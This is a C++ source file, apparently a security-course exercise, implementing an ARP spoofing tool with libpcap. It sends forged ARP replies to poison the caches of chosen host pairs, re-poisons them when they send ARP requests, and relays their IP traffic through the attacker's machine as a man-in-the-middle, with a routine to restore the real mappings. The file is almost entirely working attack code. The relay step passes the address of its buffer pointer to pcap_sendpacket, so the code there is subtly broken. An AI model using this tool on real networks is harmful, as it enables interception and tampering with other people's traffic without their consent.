#include <arpa/inet.h>
#include <sys/ioctl.h> 
#include <sys/socket.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <unistd.h>
#include <stdlib.h>
#include <cstdio>
#include <pcap.h>
#include "mac.h"
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"
#include "arpspoof.h"
#include "dumpcode.h"
#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

#define ETHER_HDR_LEN 14

Mac addressInfo::getMyMac(const char* ifname){
    struct ifreq ifr;
    int sockfd, ret;
    uint8_t macAddr[6];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        fprintf(stderr, "Fail to get interface MAC address - socket() failed - %m\n");
        exit(0);
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        exit(0);
    }

    close(sockfd);
    
    memcpy(macAddr, ifr.ifr_hwaddr.sa_data, 6);
    return Mac(macAddr);
}

Ip addressInfo::getMyIp(const char* ifname){
    struct ifreq ifr;
    int sockfd, ret;
    char ipAddr[40];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        fprintf(stderr, "Fail to get interface IP address - socket() failed - %m\n");
        exit(0);
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if (ret < 0) {
        fprintf(stderr, "Fail to get interface IP address - ioctl(SIOCSIFADDR) failed - %m\n");
        close(sockfd);
        exit(0);
    }

    close(sockfd);
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipAddr, sizeof(struct sockaddr));

    return Ip(ipAddr);
}

Mac getMacFromIP(pcap_t* handle, const addressInfo &myAddressInfo, const char* ipAddr){
    
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    EthArpPacket arpPacket;
    EthArpPacket* arpReply;
 
    Ip targetIp(ipAddr);

    arpPacket.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    arpPacket.eth_.smac_ = myAddressInfo.myMac;
    arpPacket.eth_.type_ = htons(EthHdr::Arp);

    arpPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    arpPacket.arp_.pro_ = htons(EthHdr::Ip4);
    arpPacket.arp_.hln_ = Mac::SIZE;
    arpPacket.arp_.pln_ = Ip::SIZE;
    arpPacket.arp_.op_ = htons(ArpHdr::Request);
    arpPacket.arp_.smac_ = myAddressInfo.myMac;
    arpPacket.arp_.sip_ = htonl(myAddressInfo.myIp); 
    arpPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
    arpPacket.arp_.tip_ = htonl(targetIp);
    
    for (int i=0;i<5;i++)
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpPacket), sizeof(EthArpPacket));
    if (res != 0) {
       	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0){      //timeout
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arpPacket), sizeof(EthArpPacket));
            if (res != 0) {
       	        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            continue;
        }
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(0);
        }

        arpReply = (EthArpPacket*)packet;
        if((arpReply->eth_.type_ == htons(EthHdr::Arp)) && (arpReply->arp_.op_ == htons(ArpHdr::Reply)) 
                && (arpReply->arp_.sip_.operator==(htonl(targetIp)))){
            return arpReply->arp_.smac_;
        }
    }
}

void spoofARP(pcap_t* handle, const addressInfo &myAddressInfo){
    struct pcap_pkthdr* header;
    const u_char* packet;
    u_char* relayPacket;
    int res;

    EthArpPacket* ethPacket;
    
    printf("Targets\n");                                                        //print (sender, target) pairs
    for (int i = 0; i < myAddressInfo.targetPairs.size(); i++){
        const char* ip = myAddressInfo.targetPairs[i].first;
        string mac = myAddressInfo.arpCache.find(ip)->second.operator std::string();
        printf("Sender%d - Ip: %s, Mac: %s\n",i, ip, mac.c_str());

        ip = myAddressInfo.targetPairs[i].second;
        mac = myAddressInfo.arpCache.find(ip)->second.operator std::string();
        printf("Target%d - Ip: %s, Mac: %s\n\n",i, ip, mac.c_str());
    }

    infectArp(handle, myAddressInfo);                                           //initial infection

    while(true){                                                                //packet relay & re-infection      
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(0);
        }

        ethPacket = (EthArpPacket*)packet;   
        if(ethPacket->eth_.type_ == htons(EthHdr::Arp)){                        //check whether it's an arp REQ
            if(ethPacket->arp_.op_ == htons(ArpHdr::Request)){
                for (int i = 0; i<myAddressInfo.targetPairs_IP_object.size(); i++){
                    const Ip &s_Ip = myAddressInfo.targetPairs_IP_object[i].first;
                    const Ip &t_Ip = myAddressInfo.targetPairs_IP_object[i].second;

                    if((ethPacket->arp_.sip_.operator==(s_Ip) && ethPacket->arp_.tip_.operator==(t_Ip))       //sender -> target REQ 
                        || (ethPacket->arp_.sip_.operator==(t_Ip) && ethPacket->arp_.tip_.operator==(s_Ip))){  //target -> sender REQ
                            printf("Re-infecting sender%d: %s\n",i,myAddressInfo.targetPairs[i].first);       //re-infect sender
                            sendFakeARP(handle, myAddressInfo, myAddressInfo.targetPairs[i].first, myAddressInfo.targetPairs[i].second);
                    }
                }
            }
            continue;
        } 
        
        if(ethPacket->eth_.type_ == htons(EthHdr::Ip4)){                         //relay IP packet   
            Mac &dmac = ethPacket->eth_.dmac_;
            Mac &smac = ethPacket->eth_.smac_;

            for (int i = 0; i<myAddressInfo.targetPairs.size(); i++){
                const Mac &senderMac = myAddressInfo.arpCache.find(myAddressInfo.targetPairs[i].first)->second;

                if((dmac.operator==(myAddressInfo.myMac)) && (smac.operator==(senderMac))){      //sender => target Ip packet 
                    printf("Relaying %d bytes packet: sender%d - %s => target%d - %s\n",
                        header->caplen, i,myAddressInfo.targetPairs[i].first,i,myAddressInfo.targetPairs[i].second);

                    relayPacket = (u_char*)malloc(header->caplen);
                    memcpy(relayPacket, packet, header->caplen);

                    ((EthHdr*)relayPacket)->smac_ = myAddressInfo.myMac;
                    ((EthHdr*)relayPacket)->dmac_ = myAddressInfo.arpCache.find(myAddressInfo.targetPairs[i].second)->second;
                    dumpcode(relayPacket,header->caplen);
                    //exit(0);
                    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&relayPacket), header->caplen);
                    printf("send result %d\n",res);
                    if (res != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                    }
                    free(relayPacket);
                    break;
                }   
            }
        }
    }
}

void infectArp(pcap_t* handle, const addressInfo &myAddressInfo){
    for (const auto& it : myAddressInfo.targetPairs){
        sendFakeARP(handle, myAddressInfo, it.first, it.second);     //sendFakeARP(..., senderIp, targetIp)
    }
}

void recoverArp(pcap_t* handle, const addressInfo &myAddressInfo){
    for (const auto& it : myAddressInfo.targetPairs){
        sendNormalARP(handle, myAddressInfo, it.first, it.second);   //sendNormalARP(..., senderIp, targetIp)
    }
}

void sendFakeARP(pcap_t* handle, const addressInfo &myAddressInfo, const char* senderIp, const char* targetIp){

    Mac senderMac = myAddressInfo.arpCache.find(senderIp)->second;
    //Mac targetMac = myAddressInfo.arpCache.find(targetIp)->second;

    EthArpPacket packet;

    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = myAddressInfo.myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myAddressInfo.myMac;
    packet.arp_.sip_ = htonl(Ip(targetIp));
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(Ip(senderIp));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
    	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void sendNormalARP(pcap_t* handle, const addressInfo &myAddressInfo, const char* senderIp, const char* targetIp){

    Mac senderMac = myAddressInfo.arpCache.find(senderIp)->second;
    Mac targetMac = myAddressInfo.arpCache.find(targetIp)->second;

    EthArpPacket packet;

    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = targetMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = targetMac;
    packet.arp_.sip_ = htonl(Ip(targetIp));
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(Ip(senderIp));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
    	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
